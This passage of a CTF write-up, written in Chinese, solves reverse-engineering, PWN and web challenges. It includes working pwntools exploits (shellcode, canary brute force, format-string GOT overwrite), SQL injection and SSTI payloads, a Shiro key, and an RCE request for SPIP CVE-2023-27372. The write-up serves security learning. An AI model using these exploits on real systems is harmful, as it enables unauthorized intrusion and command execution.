class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">check_index = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>]</span><br><span class="line">check_enc = [<span class="number">0x05</span>,<span class="number">0xd7</span>,<span class="number">0xb8</span>,<span class="number">0x67</span>]</span><br><span class="line">c = [check_enc[check_index[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">c0 = bytes_to_long(<span class="built_in">bytes</span>(c)[::-<span class="number">1</span>])</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="string">&#x27;3c471c36&#x27;</span>[::-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">key = [<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">d = decrypt([c0,c1], key)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(d[<span class="number">0</span>])[<span class="number">2</span>:]+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">hex</span>(d[<span class="number">1</span>])[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#688ed036-a86a60ce</span></span><br></pre></td></tr></table></figure><p>flag：<code>flag&#123;688ed036-a86a60ce&#125;</code></p><p>​</p><h3 id="ROULETTE"><a href="#ROULETTE" class="headerlink" title="ROULETTE"></a>ROULETTE</h3><blockquote><p>听说麻将连胜8局达到8本场就可以直接役满？！！<br>那么…这个游戏连胜8局难道会直接得到flag？！！！<br>（宫永照脸<br>flag形式同其他题目。</p></blockquote><p>patch <code>main_0()</code> 中的 <code>call sub_43E165</code> 为 <code>call sub_445990</code>，</p><p>再运行patch后的程序，直接输出结果 <code>HSCCTF&#123;H31L0_My_FR13ND!&#125;</code>。</p><p>​</p><h3 id="THE-WOLF-SONG"><a href="#THE-WOLF-SONG" class="headerlink" title="THE_WOLF_SONG"></a>THE_WOLF_SONG</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example}<br>听电子音乐，享赛博人生。</p></blockquote><p>patch main函数的输出。进入 <code>sub_1400440F0()</code>，识别为RC4算法。</p><p>照代码逻辑动调逆一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0xCE</span>, <span class="number">0x26</span>, <span class="number">0x9C</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xD9</span>, <span class="number">0xFD</span>, <span class="number">0x23</span>, <span class="number">0xBA</span>, <span class="number">0x9A</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xA8</span>, <span class="number">0x2E</span>, <span class="number">0xBD</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0xB7</span>, <span class="number">0x5D</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xFD</span>, <span class="number">0xCD</span>, <span class="number">0x63</span>, <span class="number">0x13</span>, <span class="number">0x0A</span>, <span class="number">0x94</span>, <span class="number">0x5B</span>, <span class="number">0x95</span>, <span class="number">0x2C</span>, </span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x60</span>, <span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0xB4</span>, <span class="number">0x30</span>, <span class="number">0x89</span>, <span class="number">0xCF</span>, <span class="number">0xEF</span>, <span class="number">0x68</span>]</span><br><span class="line">b890 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">b8a0 = [<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0xa</span>,<span class="number">0xf</span>,<span class="number">0x14</span>,<span class="number">0x19</span>,<span class="number">0x1e</span>,<span class="number">0</span>]</span><br><span class="line">k = <span class="string">b&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">c = [c[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^(k[i+<span class="number">1</span>] <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(k)-<span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^(k[i] <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(k) <span class="keyword">else</span> <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4</span></span><br><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    S[i] = i</span><br><span class="line">    Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    j = (j + S[i] + Key[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    i = (i + <span class="number">1</span>) % N</span><br><span class="line">    j = (j + S[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">t = [k^b890[b8a0[<span class="number">1</span>]] <span class="keyword">for</span> k <span class="keyword">in</span> t]</span><br><span class="line">t = [k^b890[b8a0[<span class="number">0</span>]] <span class="keyword">for</span> k <span class="keyword">in</span> t]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="NO-PY"><a href="#NO-PY" class="headerlink" title="NO_PY"></a>NO_PY</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example} 将得到的flag改为HSCCTF。</p></blockquote><p>参考 BeginCTF 2024 - ezpython。</p><p>pyinstxtractor解包程序，pycdc反编译pyc , 发现是个SM4加密，缺少 key 和 enc。</p><p>继续反编译 <code>PYZ-00.pyz_extracted/secret.pyc</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;Please_Do_not_py&#x27;</span></span><br><span class="line">enc = <span class="string">b&#x27;YJ+70VWYioYm3EhF6qdScVXBpCdPm+hCS/HP+Gj421RyxkZbwzni7o2zGG/Mis4Wr6sbXYr4ufnKwQk7vrG8yA==&#x27;</span></span><br></pre></td></tr></table></figure><p>直接用SM4解不出，再反编译看 <code>PYZ-00.pyz_extracted/gmssl/sm4.pyc</code> 对比，发现魔改点，对key做了异或操作：<code>key = (lambda .0: [ i ^ 102 for i in .0 ])(key)</code></p><p>将key异或102，再SM4解密得flag：<code>flag&#123;Pay_M0re_@ttention_to_th3_key!!&#125;</code>。</p><p>​</p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="STACK"><a href="#STACK" class="headerlink" title="STACK"></a>STACK</h3><p>栈溢出，<code>gift()</code> 函数只给了 <code>jmp rsp</code>，控制rsp即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">|          buf         |   rbp   |        ret        |            ... ...          |</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">| shellcode    +       padding   |   gadget(jmp rsp) | asm(sub rsp, 0x90;jmp rsp)  |</span><br><span class="line">------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>当ret的时候，rip被赋值，指向了当前的rsp所指向的值，即jmp rsp的gadget，同时rsp自减一个字；</p><p>当程序继续执行，jmp rsp时，执行流被劫持到栈上，具体地址为ret的后一个字；</p><p>继续执行我们布置好的指令：rsp自减，指向buf开头，即shellcode开头。rip自动后移，指向jmp rsp；</p><p>继续执行，控制流jmp到rsp所指，buf的开头区域，顺利执行shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">14028</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gift=<span class="number">0x40063B</span></span><br><span class="line">ret=<span class="number">0x40050e</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">sc=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">pl=sc.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(gift)+asm(<span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="PWN01"><a href="#PWN01" class="headerlink" title="PWN01"></a>PWN01</h3><p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/yld666/article/details/134840123">NJCTF 2017 - messager</a>， 在函数 <code>sub_400BE9()</code> 存在一个明显的栈溢出漏洞，由于程序fork出了子进程，子进程的崩溃不影响主进程，故可通过爆破方式突破canary保护，覆盖函数返回地址改为 <code>sub_400B8E()</code> 得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>, <span class="number">14831</span>)</span><br><span class="line">            r.recv()</span><br><span class="line">            r.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span> + canary + <span class="built_in">bytes</span>([x]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r.recv()</span><br><span class="line">                canary += <span class="built_in">bytes</span>([x])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                r.close()</span><br><span class="line">            <span class="built_in">print</span>(x,canary)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line">canary = get_canary()</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>, <span class="number">14831</span>)</span><br><span class="line">target = <span class="number">0x400b8e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span> + canary + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(target)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h3><p>参考 <a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/113512748">BUUCTF - inndy_echo2</a>，PIE+64为fmt，利用fmt泄露canary和程序基址，再改printf的got地址为system_plt即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">13978</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;%39$p&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;%41$p&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">eval</span>(r.recvline())-<span class="number">74</span>-<span class="number">0x9b9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">system_plt=pie+<span class="number">0x790</span>                 </span><br><span class="line">printf_got=pie+elf.got.printf</span><br><span class="line"></span><br><span class="line">pl=fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h3 id="GHOST"><a href="#GHOST" class="headerlink" title="GHOST"></a>GHOST</h3><p>参考 <a target="_blank" rel="noopener" href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Pwn/Ez_op/wp.md">RoarCTF 2019 - Ez-op</a>，题目是一个功能简单的vm，共有push/pop/add/sub/mul/div/load/save 8种指令。</p><p>漏洞在于load和save没有对offset进行检查，导致vm stack越界访问和写入，而题目是静态编译，free_hook和system等地址都已知。</p><p>由于stack-&gt;data指向堆，所以需要先利用load将堆地址读入vm stack中，然后和bss上的free_hook进行sub操作，再进行div 4就可以获得堆地址和free_hook之间的偏移，将system地址写入之后，后面触发free(input)的地方就可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">11764</span>)</span><br><span class="line"></span><br><span class="line">push = <span class="number">0xAAAA</span></span><br><span class="line">pop  = <span class="number">0xBBBB</span></span><br><span class="line">add  = <span class="number">0xCCCC</span></span><br><span class="line">sub  = <span class="number">0xDDDD</span></span><br><span class="line">mul  = <span class="number">0xEEEE</span></span><br><span class="line">div  = <span class="number">0xFFFF</span></span><br><span class="line">load = <span class="number">0x1145</span></span><br><span class="line">save = <span class="number">0x1919</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8050940</span></span><br><span class="line">free_hook = <span class="number">0x80dc9F0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> d])</span><br><span class="line"></span><br><span class="line">heap_offset = (<span class="number">0x110</span>-<span class="number">8</span>) // <span class="number">4</span></span><br><span class="line">code = create([push,push,push,push,load,push,sub,div,save])</span><br><span class="line">data = create([<span class="string">&quot;/bin/sh&quot;</span>,system_addr,<span class="number">4</span>,heap_offset,free_hook])</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(data)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CHECKIN-2"><a href="#CHECKIN-2" class="headerlink" title="CHECKIN"></a>CHECKIN</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;php://filter/<span class="subst">$a</span>/resource=/dev/null&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>)===<span class="string">&quot;2024&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>参考 ImaginaryCTF Round 28 - Filter Master，预期是构造filter链生成所需字符串。</p><p>非预期：</p><p>传入 <code>resource=data:,2024&lt;|string.strip_tags|</code>，利用PHP通过简单识别 <code>|</code> 作为filter分割字符来选择filter的特性。</p><p>payload：</p><p>POST <code>1=resource=data:,2024&lt;|string.strip_tags|</code></p><p>​</p><h3 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ccut&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waffff</span>(<span class="params"><span class="variable">$sql</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/infor|sys|sql|thread|case|when|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|&lt;|&gt;|=|xor|and|&amp;&amp;|\\\\/i&quot;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waffff</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>要求输入的password参数值等于系统的password值，利用union select实现输入和输出内容一致，Quine注入。</p><p>POST:</p><p><code>password=1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></p><p>​</p><h3 id="TMPL"><a href="#TMPL" class="headerlink" title="TMPL"></a>TMPL</h3><p>SSTI漏洞，限制了部分字符，用fenjing解决。</p><p>payload：</p><p><code>&#123;&#123;g|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*3)%(112,111,112))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,108,111,98,97,108,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*12)%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*10)%(95,95,105,109,112,111,114,116,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*2)%(111,115))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*5)%(112,111,112,101,110))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*9)%(99,97,116,32,47,102,108,97,103))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*4)%(114,101,97,100))()&#125;&#125;</code></p><p>​</p><h3 id="SHIROSHORTMENSHELL"><a href="#SHIROSHORTMENSHELL" class="headerlink" title="SHIROSHORTMENSHELL"></a>SHIROSHORTMENSHELL</h3><p>使用shiro攻击工具shiro_attack-4.5.2-SNAPSHOT-all.jar，找到key：<code>kPH+bIxk5D2deZiIxcaaaA==</code>，再用cb1链打通getshell即可。</p><p>​</p><h3 id="DESERIALIZATION"><a href="#DESERIALIZATION" class="headerlink" title="DESERIALIZATION"></a>DESERIALIZATION</h3><p>SPIP CMS &lt;v4.2.1 反序列化RCE漏洞（CVE-2023-27372）</p><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/spmonkey/p/17550492.html">【漏洞复现】CVE-2023-27372 RCE漏洞</a></p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /spip.php?page=spip_pass</span><br><span class="line"></span><br><span class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:21:&quot;&lt;?=system(&#x27;ls /&#x27;); ?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><p>读文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /spip.php?page=spip_pass HTTP/1.1</span><br><span class="line"></span><br><span 